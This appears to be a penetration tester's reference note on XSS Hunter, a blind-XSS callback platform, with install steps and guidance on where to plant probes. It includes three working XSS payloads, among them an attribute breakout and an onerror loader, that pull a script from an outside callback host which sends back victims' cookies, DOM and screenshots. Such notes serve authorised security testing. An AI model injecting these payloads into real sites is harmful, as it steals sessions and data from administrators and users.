# XSS Hunter

**Tags:** #XSSHunter #BlindXSS #XSS #WebAppAttacks #OOB #Callback

`XSS Hunter` is a blind-XSS callback platform. You inject a payload that loads its probe script; whenever that script fires — possibly days later, in an admin panel or log viewer you never see — it phones home with the page URL, referrer, cookies, full DOM, and a screenshot. That evidence bundle is what makes a blind finding reportable, since you otherwise have no proof the payload ever executed.

**Source:** https://github.com/trufflesecurity/xsshunter (self-hostable) — hosted at https://xsshunter.trufflesecurity.com/
**Install:** use the hosted service, or self-host with `git clone https://github.com/trufflesecurity/xsshunter && docker compose up`

```html
<!-- Standard probe payload — <id> is your XSS Hunter subdomain/identifier -->
<script src="https://<id>.xss.ht"></script>

<!-- Break out of an attribute first -->
'"><script src="https://<id>.xss.ht"></script>

<!-- Script tags filtered — load the probe dynamically -->
<img src=x onerror="var s=document.createElement('script');s.src='https://<id>.xss.ht';document.body.appendChild(s)">
```

**Where to plant probes** — anywhere a privileged human later reads your input: support/contact forms, order notes, user-agent and referer headers, profile fields, filenames, and anything that lands in a log dashboard.

> [!tip] Salt each injection point with a distinguishable identifier (a per-field subdomain or path) so the callback tells you *which* field fired — otherwise you get a hit with no idea where it came from.

> [!note] Self-hosting is worth it on real engagements: probe data includes the client's DOM and cookies, which usually shouldn't transit a third-party service. Check the rules of engagement before using the hosted instance.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]] — blind XSS delivery and callback capture; [[Tools/Web/dalfox|dalfox]] and [[Tools/Web/XSStrike|XSStrike]] can inject the probe at scale.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
